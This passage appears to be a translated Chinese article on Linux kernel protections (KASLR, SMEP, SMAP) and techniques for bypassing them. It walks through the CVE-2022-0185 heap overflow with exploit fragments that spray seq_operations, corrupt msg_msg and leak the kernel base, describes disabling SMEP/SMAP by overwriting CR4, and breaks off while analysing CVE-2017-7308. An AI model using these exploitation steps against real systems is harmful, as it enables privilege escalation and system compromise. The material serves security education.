---
title: Linux内核常用保护和绕过技术
url: https://www.anquanke.com/post/id/286488
source: 安全客-有思想的安全新媒体
date: 2023-02-22
fetch_date: 2025-10-04T07:41:32.495344
---

# Linux内核常用保护和绕过技术

首页

阅读

* [安全资讯](https://www.anquanke.com/news)
* [安全知识](https://www.anquanke.com/knowledge)
* [安全工具](https://www.anquanke.com/tool)

活动

社区

学院

安全导航

内容精选

* [专栏](/column/index.html)
* [精选专题](https://www.anquanke.com/subject-list)
* [安全KER季刊](https://www.anquanke.com/discovery)
* [360网络安全周报](https://www.anquanke.com/week-list)

# Linux内核常用保护和绕过技术

阅读量**492394**

|评论**1**

发布时间 : 2023-02-21 10:30:17

**x**

##### 译文声明

本文是翻译文章

译文仅供参考，具体内容表达以及含义原文为准。

![]()

## 1、内核是什么？

内核是操作系统的核心部分。内核负责管理计算机的硬件资源，并实现操作系统的基本功能。内核是操作系统中最重要的部分，它是操作系统与硬件之间的桥梁。内核可以被看作是操作系统的“心脏”，负责控制和管理计算机系统的所有硬件和软件资源。不同的操作系统有不同的内核，比如Linux操作系统有Linux内核，Linux内核是Linux操作系统的核心部分，它是由C语言编写的程序，并且是一个开源软件，它的源代码可以自由下载和修改。Linux内核提供了多种功能，包括内存管理、进程管理、文件系统支持、网络通信等，Linux内核的设计具有高度的可扩展性和灵活性，可以应对各种应用场景和硬件平台。

## 2、内核漏洞

有代码就有漏洞，内核也不例外。内核漏洞是操作系统内核中的存在的安全漏洞，这些漏洞可能导致系统被恶意软件入侵或攻击者控制，并可能造成数据泄露、系统瘫痪等严重后果。例如：攻击者可能会利用内核漏洞来绕过系统安全保护，提升权限，从而获取用户敏感信息，或者在系统中安装恶意软件，损坏系统数据或瘫痪整个系统。著名漏洞“dirty cow”(脏牛漏洞)影响之广，从2007年到2018年之间的所有发行版都受其影响，让全世界数百万台设备暴露在威胁当中。

![]()

如图为近10年漏洞报送数量，表中可知Linux内核漏洞数量一直处于高位，基本每年在100以上，尤其2017年漏洞数量最多，达到449个之多。

因此及时发现，修复内核漏洞非常重要。通常，操作系统厂商会定期发布补丁来修复内核漏洞。同时为了减小漏洞发现造成的危害，Linux内核采用了多种技术来提高漏洞利用的难度来保护系统安全。例如：SMEP保护、SMAP保护、KASLR保护、KPTI保护。但即使是这么多保护，也无法安全保护内核，漏洞可以轻松绕过这些保护，达到提权效果。下面介绍这些年出现Linux内核保护技术以及针对这些保护技术的绕过方法。

## 3、Linux内核保护与绕过

### 3.1、KASLR 保护

linux内核（2005年）开始支持KASLR。KASLR（Kernel Address Space Layout Randomization）是一种用于保护操作系统内核的安全技术。它通过在系统启动时随机化内核地址空间的布局来防止攻击者确定内核中的精确地址。即使攻击者知道了一些内核代码的位置，也无法精确定位内核中的其他代码和数据，从而绕过系统安全保护。在实现时主要通过改变原先固定的内存布局来提升内核安全性，因此在代码实现过程中，kaslr与内存功能存在比较强的耦合关系。

随机化公式： 函数基地址 +随机值=内存运行地址

比如先查看 entry\_SYSCALL\_64函数的基地址为 0xffffffff82000000

![]()

它运行时的内存地址为0xffffffff8fa00000

![]()

将运行地址减函数基地址得到随机值变量0xda00000(0xffffffff8fa00000-0xffffffff82000000=0xda00000) ，这0xda0000就是随机值，每次系统启动的时候都会发生变化。

在有kaslr保护的情况下，漏洞触发要跳转到指定的函数位置时，由于随机值的存在，无法确定函数在内存中的具体位置，如果要利用就需要预先知道目标函数地址以及shellcode存放在内存中的地址，这使得漏洞利用比较困难。

针对这种保护技术，目前比较常规的绕过方法是利用漏洞泄露出内核中某些结构体，通过上面计算方法算出内核基地址,有了基地址后就可以计算想要的函数地址了。

如CVE-2022-0185，是一个提权漏洞,漏洞成因是 len > PAGE-2-size 整数溢出导致判断错误，后面继续拷贝造成堆溢出。

```
diff --git a/fs/fs_context.c b/fs/fs_context.c
index b7e43a780a625..24ce12f0db32e 100644
--- a/fs/fs_context.c
+++ b/fs/fs_context.c
@@ -548,7 +548,7 @@ static int legacy_parse_param(struct fs_context *fc, struct fs_parameter *param)
                   param->key);
     }

-    if (len > PAGE_SIZE - 2 - size)        //这里存在整数溢出，后面的拷贝会造成堆溢出
+    if (size + len + 2 > PAGE_SIZE)
         return invalf(fc, "VFS: Legacy: Cumulative options too large");
     if (strchr(param->key, ',') ||
         (param->type == fs_value_is_string &&
```

函数调用路径：\_x64\_sys\_fsconfig() —-> vfs\_fsconfig\_locked()—>vfs\_parse\_fs\_param()—>legacy\_parse\_param()，vfs\_parse\_fs\_param()中的函数指针定义在legacy\_fs\_context\_ops函数表中，在alloc\_fs\_context()函数中完成filesystem context结构的分配和初始化。

在legacy\_parse\_param 函数：linux5.11/fs/fs\_context.c: legacy\_parse\_param

```
static int legacy_parse_param(struct fs_context *fc, struct fs_parameter *param)
{
    struct legacy_fs_context *ctx = fc->fs_private;
    unsigned int size = ctx->data_size;
    size_t len = 0;

    ··· ···
    ··· ···
    switch (param->type) {
    case fs_value_is_string:
        len = 1 + param->size;
        fallthrough;
    ··· ···
    }

    if (len > PAGE_SIZE - 2 - size) //--此处边界检查有问题
        return invalf(fc, "VFS: Legacy: Cumulative options too large");
    if (strchr(param->key, ',') ||
        (param->type == fs_value_is_string &&
         memchr(param->string, ',', param->size)))
        return invalf(fc, "VFS: Legacy: Option '%s' contained comma",
                  param->key);
    if (!ctx->legacy_data) {
        ctx->legacy_data = kmalloc(PAGE_SIZE, GFP_KERNEL); //在第一次时会分配一页大小
        if (!ctx->legacy_data)
            return -ENOMEM;
    }

    ctx->legacy_data[size++] = ',';
    len = strlen(param->key);
    memcpy(ctx->legacy_data + size, param->key, len);
    size += len;
    if (param->type == fs_value_is_string) {
        ctx->legacy_data[size++] = '=';
        memcpy(ctx->legacy_data + size, param->string, param->size); //拷贝，存在越界
        size += param->size;
    }
    ctx->legacy_data[size] = '\0';
    ctx->data_size = size;
    ctx->param_type = LEGACY_FS_INDIVIDUAL_PARAMS;
    return 0;
}
```

(len > PAGE\_SIZE – 2 – size )判断处有问题，根据符号优先级 ”-“的优先级是4，”>” 的优先级是6，所以先执行右边模块。又因为数据类型自动转换原则，”PAGE\_SIZE-2-size” 转换为无符号进行运算。size变量由用户空间传入，当size的值大于“PAGE\_SIZE-2”的差值时，运算产生溢出。后面拷贝时，size是大于kmalloc申请的“PAGE\_SIZE – 2”大小。在memcpy(ctx->legacy\_data + size, param->string, param->size); 这个位置，导致溢出。

legacy\_parse\_param函数是处理文件系统挂载过程中的一些功能，所以对这个漏洞的利用，不同磁盘格式利用方式也不一样，这里我们在ext4磁盘格式下，了解一下其漏洞利用过程。首先fsopen打开一个文件系统环境，用户可以用来mount新的文件系统。 fsconfig()调用能让我们往 ctx->legacy\_data写入一个新的(key,valu),ctx->legacy\_data指向一个4096字节的缓冲区（首次配置文件系统时就分配）。 len > PAGE\_SIZE-2-size , len是将要写的长度，PAGE\_SIZE == 4096, size是已写的长度，2字节表示一个逗号和一个NULL终止符。当size是unsigned int（总是被当作正值），会导致整数溢出，如果相减的结果小于0，还是被包装成正值。执行117次后添加长度为0的key和长度为33的value，最终的size则为（117\*（33+2））==4095，这样PAGE\_SIZE-2-size==-1==18446744073709551615 ,这样无论len多大都能满足条件。可以设置为”\x00”,这样逗号会写入偏移4095，等号写入下给kmalloc-4096d 偏移0处，接着就能往偏移1处开始往后写value。

针对这个漏洞，我们可以利用seq\_operations结构体泄露内核基地址从而绕过KASLR，seq\_operations 是一个大小为0x20的结构体，在打开/proc/self/stat会申请出来。里面定义了四个函数指针，通过他们可以泄露出内核基地址。

```
struct seq_operations {
    void * (*start) (struct seq_file *m, loff_t *pos);
    void (*stop) (struct seq_file *m, void *v);
    void * (*next) (struct seq_file *m, void *v, loff_t *pos);
    int (*show) (struct seq_file *m, void *v);
};
```

利用seq\_operations泄露内核基地址：堆喷大量 seq\_operations (open(“/proc/self/stat”,O\_RDONLY)) ,溢出篡改msg\_msg->m\_ts的值，从而泄露基地址。

* 准备 fs\_context 漏洞对象；

```
int call_fsopen(){
    int fd = fsopen("ext4",0);
    if(fd <0){
        perror("fsopen");
        exit(-1);
    }
    return fd;
}
```

* 往kmalloc-32堆喷seq\_operations对象；

```
   for(int i=0;i<100;i++){
        open("/proc/self/stat",O_RDONLY);
    }
```

* 创建大量msg\_msg消息(大小为0xfe8)，会将辅助消息分配在kmalloc-32
* 触发kmalloc-4096溢出，修改msg\_msg->m\_ts;

```
    char tiny_evil[] = "DDDDDD\x60\x10";
    fsconfig(fd,FSCONFIG_SET_STRING,"CCCCCCCC",tiny,0);
    fsconfig(fd,FSCONFIG_SET_STRING,"\x00",tiny_evil,0);
```

* 利用msg\_msg越界读，泄露内核指针。

```
  get_msg(targets[i],received,size,0,IPC_NOWAIT | MSG_COPY | MSG_NOERROR);
  printf("[*] received 0x%lx\n", kbase);
```

泄露出基地址后，可根据偏移计算任何内核函数地址达到提权。

### 3.2、SMEP&SMAP保护

linux内核从3.0（2011年8月）开始支持SMEP，3.7（2012年12月）开始支持SMAP。SMEP（Supervisor Mode Execution Protection）是一种用于保护操作系统内核安全的技术。它通过在CPU开一个比特位，来限制内核态访问用户态的代码。当有了内核的控制权去执行用户态中的shellcode，CPU会拒绝执行该操作，并向操作系统发出一个异常中断。这样，即使攻击者成功执行了恶意代码，也无法绕过系统安全保护访问，从而大大增强了系统的安全性。根据CR4寄存器的值判断是否开启smep保护，当CR4寄存器的第20位是1时，保护开启，为0时，保护关闭。

![]()

SMAP（Supervisor Mode Access Protection）是一种用于保护操作系统内核的安全技术。它与SMEP相似，都在CPU中开启一个比特位来限制内核态访问用户态的能力。它使用户态的指针无法被内核态解引用。这样即使攻击者成功执行了恶意代码，也无法绕过系统安全保护读取内核空间中的敏感信息。判断CR4寄存器的值来确定是否开启，当CR4寄存器的值第21位是1时，SMAP开启。

![]()

针对SMEP、SMAP保护时，一般是通过漏洞修改寄存器关闭保护，达到绕过保护的目的。比如可以通过获得内核基地址后算出native\_write\_cr4函数在内存运行时地址,控制PC跳转到native\_write\_cr4函数去覆写CR4寄存器的20位和21位关闭保护，CPU只是判断CR4寄存器的20位21位的值，只要为0零就能关闭保护，同样也可以使用ROP的方式在内核镜像中寻找ROP组合出能修改cr4寄存器的链。

CVE-2017-7308漏洞，是内核套接字中的packet\_set\_ring()函数没有正确检测size,长度判断条件错误，导致堆溢出。

```
static int packet_set_ring(struct sock *sk, union tpacket_req_u *req_u,
        int closing, int tx_ring){
    ...
    if (po->tp_version >= TPACKET_V3 &&
                (int)(req->tp_block_size -
                  BLK_PLUS_PRIV(req_u->req3.tp_sizeof_priv)) <= 0)
                goto out;
     ...
}
```

判断内存块头部加上每个内存块私有数据的大小不超过内存块自身的大小，保证内存中有足够的空间。当req\_u->req3.tp\_sizeof\_priv 接近unsigned int 的最大值时，这个判断就会被绕过。随后代码执行到init\_prb\_bdqc函数处创建环形缓冲区。

```
static int packet_set_ring(struct sock *sk, union tpacket_req_u *req_u,
        int closing, int tx_ring){

    ...
        order = get_order(req->tp_block_size);    // 内核页的阶
        pg_vec = alloc_pg_vec(req, order);    // 在某个阶上取一页
        if (unlikely(!pg_vec))
            goto out;
        // 创建一个接收数据包的TPACKET_V3环形缓冲区。
        switch (po->tp_version) {
            case TPACKET_V3:
            /* Transmit path is not supported. We ...